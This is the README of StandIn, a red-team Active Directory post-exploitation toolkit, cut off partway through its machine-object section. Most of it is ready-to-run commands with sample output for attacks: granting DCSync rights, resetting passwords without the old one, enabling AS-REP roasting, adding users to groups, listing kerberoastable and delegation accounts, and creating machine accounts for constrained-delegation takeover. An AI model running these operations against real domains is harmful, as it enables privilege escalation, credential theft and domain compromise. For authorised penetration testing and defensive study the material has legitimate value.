# StandIn

StandIn is a small AD post-compromise toolkit. StandIn came about because recently at [xforcered](https://github.com/xforcered) we needed a .NET native solution to perform resource based constrained delegation. However, StandIn quickly ballooned to include a number of comfort features.

I want to continue developing StandIn to teach myself more about Directory Services programming and to hopefully expand a tool which fits in to the AD post-exploitation toolchain.

# Roadmap

#### Contributing

Contributions are most welcome. Please ensure pull requests include the following items: description of the functionality, brief technical explanation and sample output.

#### ToDo's

The following items are currently on the radar for implementation in subsequent versions of StandIn.

- Domain share enumeration. This can be split out into two parts, (1) finding and getting a unique list based on user home directories / script paths / profile paths and (2) querying fTDfs / msDFS-Linkv2 objects.
- Finding and parsing GPO's to map users to host local groups. 

# Subject References

- An ACE up the sleeve (by [@_wald0](https://twitter.com/_wald0) & [@harmj0y](https://twitter.com/harmj0y)) - [here](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf)
- Kerberoasting (by [@_xpn_](https://twitter.com/_xpn_)) - [here](https://blog.xpnsec.com/kerberos-attacks-part-1/)
- Roasting AS-REPs (by [@harmj0y](https://twitter.com/harmj0y)) - [here](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- Kerberos Unconstrained Delegation (by [@spotheplanet](https://twitter.com/spotheplanet)) - [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- S4U2Pwnage (by [@harmj0y](https://twitter.com/harmj0y)) - [here](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- Resource-based Constrained Delegation (by [@spotheplanet](https://twitter.com/spotheplanet)) - [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- Rubeus - [here](https://github.com/GhostPack/Rubeus)
- Powerview - [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- Powermad (by [@kevin_robertson](https://twitter.com/kevin_robertson)) - [here](https://github.com/Kevin-Robertson/Powermad)

# Index
- [Help](#help)
- [LDAP Object Operations](#ldap-object-operations)
    - [Get object](#get-object)
    - [Get object access permissions](#get-object-access-permissions)
    - [Grant object access permission](#grant-object-access-permission)
    - [Set object password](#set-object-password)
    - [Add ASREP to object flags](#addremove-asrep-from-object-flags)
    - [Remove ASREP from object flags](#addremove-asrep-from-object-flags)
- [ASREP](#asrep)
- [SPN](#spn)
- [Unconstrained / constrained / resource-based constrained delegation](#unconstrained--constrained--resource-based-constrained-delegation)
- [DC's](#dcs)
- [Groups Operations](#groups-operations)
    - [List group membership](#list-group-membership)
    - [Add user to group](#add-user-to-group)
- [Machine Object Operations](#machine-object-operations)
    - [Create machine object](#create-machine-object)
    - [Disable machine object](#disable-machine-object)
    - [Delete machine object](#delete-machine-object)
    - [Add msDS-AllowedToActOnBehalfOfOtherIdentity](#add-msds-allowedtoactonbehalfofotheridentity)
    - [Remove msDS-AllowedToActOnBehalfOfOtherIdentity](#remove-msds-allowedtoactonbehalfofotheridentity)
- [Detection](#detection)

## Help

```
  __
 ( _/_   _//   ~b33f
__)/(//)(/(/)  v0.8


 >--~~--> Args? <--~~--<

--help        This help menu
--object      LDAP filter, e.g. samaccountname=HWest
--computer    Machine name, e.g. Celephais-01
--group       Group name, e.g. "Necronomicon Admins"
--ntaccount   User name, e.g. "REDHOOK\UPickman"
--sid         String SID representing a target machine
--grant       User name, e.g. "REDHOOK\KMason"
--guid        Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
--domain      Domain name, e.g. REDHOOK
--user        User name
--pass        Password
--newpass     New password to set for object
--type        Rights type: GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync
--spn         Boolean, list kerberoastable accounts
--delegation  Boolean, list accounts with unconstrained / constrained delegation
--asrep       Boolean, list ASREP roastable accounts
--dc          Boolean, list all domain controllers
--remove      Boolean, remove msDS-AllowedToActOnBehalfOfOtherIdentity property from machine object
--make        Boolean, make machine; ms-DS-MachineAccountQuota applies
--disable     Boolean, disable machine; should be the same user that created the machine
--access      Boolean, list access permissions for object
--delete      Boolean, delete machine from AD; requires elevated AD access

 >--~~--> Usage? <--~~--<

# Query object properties by LDAP filter
StandIn.exe --object "(&(samAccountType=805306368)(servicePrincipalName=*vermismysteriis.redhook.local*))"
StandIn.exe --object samaccountname=Celephais-01$ --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Query object access permissions, optionally filter by NTAccount
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --access
StandIn.exe --object samaccountname=Rllyeh$ --access --ntaccount "REDHOOK\EDerby"
StandIn.exe --object samaccountname=JCurwen --access --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant object access permissions
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --type DCSync
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
StandIn.exe --object samaccountname=SomeTarget001$ --grant "REDHOOK\MBWillett" --type GenericWrite --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Set object password
StandIn.exe --object samaccountname=SomeTarget001$ --newpass "Arkh4mW1tch!"
StandIn.exe --object samaccountname=BJenkin --newpass "Dr34m1nTh3H#u$e" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add ASREP to userAccountControl flags
StandIn.exe --object samaccountname=HArmitage --asrep
StandIn.exe --object samaccountname=FMorgan --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove ASREP from userAccountControl flags
StandIn.exe --object samaccountname=TMalone --asrep --remove
StandIn.exe --object samaccountname=RSuydam --asrep  --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all ASREP roastable accounts
StandIn.exe --asrep
StandIn.exe --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all kerberoastable accounts
StandIn.exe --spn
StandIn.exe --spn --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List all accounts with unconstrained & constrained delegation privileges
StandIn.exe --delegation
StandIn.exe --delegation --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all domain controllers
StandIn.exe --dc

# List group members
StandIn.exe --group Literarum
StandIn.exe --group "Magna Ultima" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add user to group
StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley"
StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Create machine object
StandIn.exe --computer Innsmouth --make
StandIn.exe --computer Innsmouth --make --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Disable machine object
StandIn.exe --computer Arkham --disable
StandIn.exe --computer Arkham --disable --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Delete machine object
StandIn.exe --computer Danvers --delete
StandIn.exe --computer Danvers --delete --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add msDS-AllowedToActOnBehalfOfOtherIdentity to machine object properties
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties
StandIn.exe --computer Miskatonic --remove
StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
```

## LDAP Object Operations
All object operations expect that the LDAP filter returns a single object and will exit out if your query returns more. This is by design.

### Get object

#### Use Case

> *Operationally, we may want to look at all of the properties of a specific object in AD. A common example would be to look at what groups a user account is member of or when a user account last authenticated to the domain.*

#### Syntax

Get all properties of the resolved object. Queries can be simple matches for a single property or complex LDAP filters.

```
C:\> StandIn.exe --object samaccountname=m-10-1909-01$

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-01
    Path     : LDAP://CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local

[?] Iterating object properties

[+] logoncount
    |_ 360
[+] codepage
    |_ 0
[+] objectcategory
    |_ CN=Computer,CN=Schema,CN=Configuration,DC=main,DC=redhook,DC=local
[+] iscriticalsystemobject
    |_ False
[+] operatingsystem
    |_ Windows 10 Enterprise
[+] usnchanged
    |_ 195797
[+] instancetype
    |_ 4
[+] name
    |_ M-10-1909-01
[+] badpasswordtime
    |_ 0x0
[+] pwdlastset
    |_ 10/9/2020 4:42:02 PM UTC
[+] serviceprincipalname
    |_ TERMSRV/M-10-1909-01
    |_ TERMSRV/m-10-1909-01.main.redhook.local
    |_ WSMAN/m-10-1909-01
    |_ WSMAN/m-10-1909-01.main.redhook.local
    |_ RestrictedKrbHost/M-10-1909-01
    |_ HOST/M-10-1909-01
    |_ RestrictedKrbHost/m-10-1909-01.main.redhook.local
    |_ HOST/m-10-1909-01.main.redhook.local
[+] objectclass
    |_ top
    |_ person
    |_ organizationalPerson
    |_ user
    |_ computer
[+] badpwdcount
    |_ 0
[+] samaccounttype
    |_ SAM_MACHINE_ACCOUNT
[+] lastlogontimestamp
    |_ 11/1/2020 7:40:09 PM UTC
[+] usncreated
    |_ 31103
[+] objectguid
    |_ 17c80232-2ee6-47e1-9ab5-22c51c268cf0
[+] localpolicyflags
    |_ 0
[+] whencreated
    |_ 7/9/2020 4:59:55 PM
[+] adspath
    |_ LDAP://CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] useraccountcontrol
    |_ WORKSTATION_TRUST_ACCOUNT
[+] cn
    |_ M-10-1909-01
[+] countrycode
    |_ 0
[+] primarygroupid
    |_ 515
[+] whenchanged
    |_ 11/2/2020 7:59:32 PM
[+] operatingsystemversion
    |_ 10.0 (18363)
[+] dnshostname
    |_ m-10-1909-01.main.redhook.local
[+] dscorepropagationdata
    |_ 10/30/2020 6:56:30 PM
    |_ 10/25/2020 1:28:32 AM
    |_ 7/16/2020 2:15:26 PM
    |_ 7/15/2020 8:54:17 PM
    |_ 1/1/1601 12:04:17 AM
[+] lastlogon
    |_ 11/3/2020 10:21:11 AM UTC
[+] distinguishedname
    |_ CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] msds-supportedencryptiontypes
    |_ RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[+] samaccountname
    |_ M-10-1909-01$
[+] objectsid
    |_ S-1-5-21-1293271031-3053586410-2290657902-1126
[+] lastlogoff
    |_ 0
[+] accountexpires
    |_ 0x7FFFFFFFFFFFFFFF
```

### Get object access permissions

#### Use Case

> *At certain stages of the engagement, the operator may want to resolve the access permissions for a specific object in AD. Many permissions can offer an operational avenue to expand access or achieve objectives. For instance, a WriteDacl permission on a group could allow the operator to grant him / her self permissions to add a new user to the group. Tools like [SharpHound](https://github.com/BloodHoundAD/SharpHound3) already, in many instances, reveal these Dacl weaknesses.*

#### Syntax

Retrieve the active directory rules that apply to the resolved object and translate any schema / rights GUID's to their friendly name. Optionally filter the results by an NTAccount name.

```
C:\>StandIn.exe --object samaccountname=m-10-1909-01$ --access

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-01
    Path     : LDAP://CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\domainjoiner
    |_ Group : MAIN\Domain Join

[+] Object access rules

[+] Identity --> NT AUTHORITY\SELF
    |_ Type       : Allow
    |_ Permission : CreateChild, DeleteChild
    |_ Object     : ANY

[+] Identity --> NT AUTHORITY\Authenticated Users
    |_ Type       : Allow
    |_ Permission : GenericRead
    |_ Object     : ANY
    
    [... Snip ...]

C:\> StandIn.exe --object samaccountname=m-10-1909-01$ --access --ntaccount "MAIN\domainjoiner"

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-01
    Path     : LDAP://CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\domainjoiner
    |_ Group : MAIN\Domain Join

[+] Object access rules

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : DeleteTree, ExtendedRight, Delete, GenericRead
    |_ Object     : ANY

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : User-Account-Restrictions

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : Self
    |_ Object     : servicePrincipalName

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : Self
    |_ Object     : dNSHostName

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : sAMAccountName

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : displayName

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : description

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : User-Logon

[+] Identity --> MAIN\domainjoiner
    |_ Type       : Allow
    |_ Permission : Self
    |_ Object     : DS-Validated-Write-Computer
```

### Grant object access permission

#### Use Case

> *With the appropriate rights, the operator can grant an NTAccount special permissions over a specific object in AD. For instance, if an operator has GenericAll privileges over a user account they can grant themselves or a 3rd party NTAccount permission to change the user’s password without knowing the current password.*

#### Syntax

Add permission to the resolved object for a specified NTAccount. StandIn supports a small set of pre-defined privileges (GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync) but it also allows operators to specify a custom rights guid using the `--guid` flag.

```
C:\> whoami
main\s4uuser

C:\> StandIn.exe --group lowPrivButMachineAccess

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Group    : lowPrivButMachineAccess
    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882

[+] Members

[?] Path           : LDAP://CN=s4uUser,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : s4uUser
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1197
    
C:\> StandIn.exe --object "distinguishedname=DC=main,DC=redhook,DC=local" --access --ntaccount "MAIN\lowPrivButMachineAccess"

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Object   : DC=main
    Path     : LDAP://DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : BUILTIN\Administrators
    |_ Group : BUILTIN\Administrators

[+] Object access rules

[+] Identity --> MAIN\lowPrivButMachineAccess
    |_ Type       : Allow
    |_ Permission : WriteDacl
    |_ Object     : ANY

C:\> StandIn.exe --object "distinguishedname=DC=main,DC=redhook,DC=local" --grant "MAIN\s4uuser" --type DCSync

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Object   : DC=main
    Path     : LDAP://DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : BUILTIN\Administrators
    |_ Group : BUILTIN\Administrators

[+] Set object access rules
    |_ Success, added dcsync privileges to object for MAIN\s4uuser

C:\> StandIn.exe --object "distinguishedname=DC=main,DC=redhook,DC=local" --access --ntaccount "MAIN\s4uUser"

[?] Using DC : m-w19-dc01.main.redhook.local
[?] Object   : DC=main
    Path     : LDAP://DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : BUILTIN\Administrators
    |_ Group : BUILTIN\Administrators

[+] Object access rules

[+] Identity --> MAIN\s4uUser
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : DS-Replication-Get-Changes-All

[+] Identity --> MAIN\s4uUser
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : DS-Replication-Get-Changes

[+] Identity --> MAIN\s4uUser
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : DS-Replication-Get-Changes-In-Filtered-Set
```

### Set object password

#### Use Case

> *If the operator has `User-Force-Change-Password` permissions over a user object they can change the password for that user account without knowing the current password. This action is destructive as the user will no longer be able to authenticate which may raise alarm bells.*

#### Syntax

Set the resolved object's password without knowing the current password.

```
C:\> whoami
main\s4uuser

C:\> StandIn.exe --object "samaccountname=user005" --access --ntaccount "MAIN\lowPrivButMachineAccess"

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\Domain Admins
    |_ Group : MAIN\Domain Admins

[+] Object access rules

[+] Identity --> MAIN\lowPrivButMachineAccess
    |_ Type       : Allow
    |_ Permission : WriteDacl
    |_ Object     : ANY

C:\> StandIn.exe --object "samaccountname=user005" --grant "MAIN\s4uuser" --type resetpassword

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\Domain Admins
    |_ Group : MAIN\Domain Admins

[+] Set object access rules
    |_ Success, added resetpassword privileges to object for MAIN\s4uuser

C:\> StandIn.exe --object "samaccountname=user005" --access --ntaccount "MAIN\s4uUser"

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\Domain Admins
    |_ Group : MAIN\Domain Admins

[+] Object access rules

[+] Identity --> MAIN\s4uUser
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : User-Force-Change-Password

C:\> StandIn.exe --object "samaccountname=user005" --newpass "Arkh4mW1tch!"

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[+] Object properties
    |_ Owner : MAIN\Domain Admins
    |_ Group : MAIN\Domain Admins

[+] Setting account password
    |_ Success, password set for object
```

### Add/Remove ASREP from object flags

#### Use Case

> *If the operator has write access to a user account, they can modify the user’s `userAccountControl` flags to include `DONT_REQUIRE_PREAUTH`. Doing so allows the operator to request an AS-REP hash for the user which can be cracked offline. This process is very similar to kerberoasting. This action is not destructive, but it relies on the fact that the user has a password which can be cracked in a reasonable timeframe.*

#### Syntax

Add and remove `DONT_REQUIRE_PREAUTH` from the resolved object's `userAccountControl` flags.

```
C:\> StandIn.exe --object "samaccountname=user005" --asrep

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[*] SamAccountName           : user005
    DistinguishedName        : CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    userAccountControl       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD

[+] Updating userAccountControl..
    |_ Success

C:\> StandIn.exe --asrep

[?] Using DC : m-w16-dc01.main.redhook.local

[?] Found 1 object(s) that do not require Kerberos preauthentication..

[*] SamAccountName           : user005
    DistinguishedName        : CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    userAccountControl       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQUIRE_PREAUTH

C:\> StandIn.exe --object "samaccountname=user005" --asrep --remove

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=User 005
    Path     : LDAP://CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local

[*] SamAccountName           : user005
    DistinguishedName        : CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    userAccountControl       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQUIRE_PREAUTH

[+] Updating userAccountControl..
    |_ Success

C:\> StandIn.exe --asrep

[?] Using DC : m-w16-dc01.main.redhook.local

[?] Found 0 object(s) that do not require Kerberos preauthentication..
```

## ASREP

#### Use Case

> *This function enumerates all accounts in AD which are currently enabled and have `DONT_REQUIRE_PREAUTH` as part of their `userAccountControl` flags. These accounts can be AS-REP roasted, this process is very similar to kerberoasting.*

#### Syntax

Return all accounts that are ASREP roastable.

```
C:\> StandIn.exe --asrep

[?] Using DC : m-w16-dc01.main.redhook.local

[?] Found 1 object(s) that do not require Kerberos preauthentication..

[*] SamAccountName           : user005
    DistinguishedName        : CN=User 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    userAccountControl       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQUIRE_PREAUTH
```

## SPN

#### Use Case

> *This function enumerates all accounts in AD which are currently enabled and can be kerberoasted. Some basic account information is added for context: when was the password last set, when was the account last used and what encryption types are supported.*

#### Syntax

Return all accounts that are kerberoastable.

```
C:\> StandIn.exe --spn

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Found 1 kerberostable users..

[*] SamAccountName         : SimCritical
    DistinguishedName      : CN=SimCritical,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    ServicePrincipalName   : ldap/M-2012R2-03.main.redhook.local
    PwdLastSet             : 11/2/2020 7:06:17 PM UTC
    lastlogon              : 0x0
    Supported ETypes       : RC4_HMAC_DEFAULT
```

## Unconstrained / constrained / resource-based constrained delegation

#### Use Case

> *This function enumerates all accounts that are permitted to perform [unconstrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation), [constrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation), or [resource-based constrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) delegation. These assets can be used to expand access or achieve objectives.*

#### Syntax

Return all accounts that have either unconstrained or constrained delegation permissions, or have inbound resource-based constrained delegation privileges.

```
C:\> StandIn.exe --delegation

[?] Using DC : m-w16-dc01.main.redhook.local

[?] Found 3 object(s) with unconstrained delegation..

[*] SamAccountName           : M-2019-03$
    DistinguishedName        : CN=M-2019-03,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
    userAccountControl       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

[*] SamAccountName           : M-W16-DC01$
    DistinguishedName        : CN=M-W16-DC01,OU=Domain Controllers,DC=main,DC=redhook,DC=local
    userAccountControl       : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

[*] SamAccountName           : M-W19-DC01$
    DistinguishedName        : CN=M-W19-DC01,OU=Domain Controllers,DC=main,DC=redhook,DC=local
    userAccountControl       : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

[?] Found 2 object(s) with constrained delegation..

[*] SamAccountName           : M-2019-04$
    DistinguishedName        : CN=M-2019-04,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
    msDS-AllowedToDelegateTo : HOST/m-w16-dc01.main.redhook.local/main.redhook.local
                               HOST/m-w16-dc01.main.redhook.local
                               HOST/M-W16-DC01
                               HOST/m-w16-dc01.main.redhook.local/MAIN
                               HOST/M-W16-DC01/MAIN
    Protocol Transition      : False
    userAccountControl       : WORKSTATION_TRUST_ACCOUNT

[*] SamAccountName           : M-2019-05$
    DistinguishedName        : CN=M-2019-05,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
    msDS-AllowedToDelegateTo : cifs/m-2012r2-03.main.redhook.local
                               cifs/M-2012R2-03
    Protocol Transition      : True
    userAccountControl       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION

[?] Found 1 object(s) with resource-based constrained delegation..

[*] SamAccountName           : M-10-1909-01$
    DistinguishedName        : CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
    Inbound Delegation       : Server Admins [GROUP]
    userAccountControl       : WORKSTATION_TRUST_ACCOUNT
```

## DC's

#### Use Case

> *This function provides situational awareness by finding all domain controllers and listing some of their properties including their role assignments.*

#### Syntax

Get all domain controllers.

```
C:\> StandIn.exe --dc

[?] Using DC    : m-w16-dc01.main.redhook.local
    |_ Domain   : main.redhook.local

[*] Host                  : m-w16-dc01.main.redhook.local
    Domain                : main.redhook.local
    Forest                : main.redhook.local
    SiteName              : Default-First-Site-Name
    IP                    : 10.42.54.5
    OSVersion             : Windows Server 2016 Datacenter
    Local System Time UTC : Tuesday, 03 November 2020 03:29:17
    Role                  : SchemaRole
                            NamingRole
                            PdcRole
                            RidRole
                            InfrastructureRole

[*] Host                  : m-w19-dc01.main.redhook.local
    Domain                : main.redhook.local
    Forest                : main.redhook.local
    SiteName              : Default-First-Site-Name
    IP                    : 10.42.54.13
    OSVersion             : Windows Server 2019 Datacenter
    Local System Time UTC : Tuesday, 03 November 2020 03:29:17
```

## Groups Operations

These functions deal specificaly with domain groups.

### List group membership

#### Use Case

> *This function provides situational awareness, listing all members of a domain group including their type (user or nested group).*

#### Syntax

Enumerate group membership and provide rudementary details for the member objects.

```
C:\> StandIn.exe --group "Server Admins"

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Group    : Server Admins
    GUID     : 92af8954-58cc-4fa4-a9ba-69bfa5524b5c

[+] Members

[?] Path           : LDAP://CN=Workstation Admins,OU=Groups,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : Workstation Admins
    Type           : Group
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1108

[?] Path           : LDAP://CN=Server Admin 001,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : srvadmin001
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1111

[?] Path           : LDAP://CN=Server Admin 002,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : srvadmin002
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1184

[?] Path           : LDAP://CN=Server Admin 003,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : srvadmin003
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1185

[?] Path           : LDAP://CN=Server Admin 004,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : srvadmin004
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1186

[?] Path           : LDAP://CN=Server Admin 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : srvadmin005
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1187

[?] Path           : LDAP://CN=SimCritical,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : SimCritical
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1204
```

### Add user to group

#### Use Case

> *With appropriate access the operator can add an NTAccount to a domain group.*

#### Syntax

Add an NTAccount identifier to a domain group. Normally this would be a user but it could also be a group.

```
C:\> StandIn.exe --group lowprivbutmachineaccess

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Group    : lowPrivButMachineAccess
    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882

[+] Members

[?] Path           : LDAP://CN=s4uUser,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : s4uUser
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1197

C:\> StandIn.exe --group lowprivbutmachineaccess --ntaccount "MAIN\user001"

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Group    : lowPrivButMachineAccess
    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882

[+] Adding user to group
    |_ Success

C:\> StandIn.exe --group lowprivbutmachineaccess

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Group    : lowPrivButMachineAccess
    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882

[+] Members

[?] Path           : LDAP://CN=User 001,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : user001
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1106

[?] Path           : LDAP://CN=s4uUser,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
    samAccountName : s4uUser
    Type           : User
    SID            : S-1-5-21-1293271031-3053586410-2290657902-1197
```

## Machine Object Operations

These functions specifically are for machine operations and expect the machine name as an input.

### Create machine object

#### Use Case

> *The operator may wish to create a machine object in order to perform a [resource based constrained delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) attack. By default any domain user has the ability to create up to 10 machines on the local domain.*

#### Syntax

Create a new machine object with a random password, user `ms-DS-MachineAccountQuota` applies to this operation.

```
C:\> StandIn.exe --computer M-1337-b33f --make

[?] Using DC    : m-w16-dc01.main.redhook.local
    |_ Domain   : main.redhook.local
    |_ DN       : CN=M-1337-b33f,CN=Computers,DC=main,DC=redhook,DC=local
    |_ Password : MlCGkaacS5SRUOt

[+] Machine account added to AD..
```

The `ms-DS-MachineAccountQuota` property exists in the domain root object. If you need to verify the quota you can perform an object search as shown below.

```
C:\> StandIn.exe --object ms-DS-MachineAccountQuota=*
```

### Disable machine object

#### Use Case

> *Standard users do not have the ability to delete a machine object, however a user that create a machine can thereafter disable the machine object.*

#### Syntax

Disable a machine that was previously created. This action should be performed in the context of the same user that created the machine. Note that non-elevated users can't delete machine objects only disable them.

```
C:\> StandIn.exe --computer M-1337-b33f --disable

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-1337-b33f
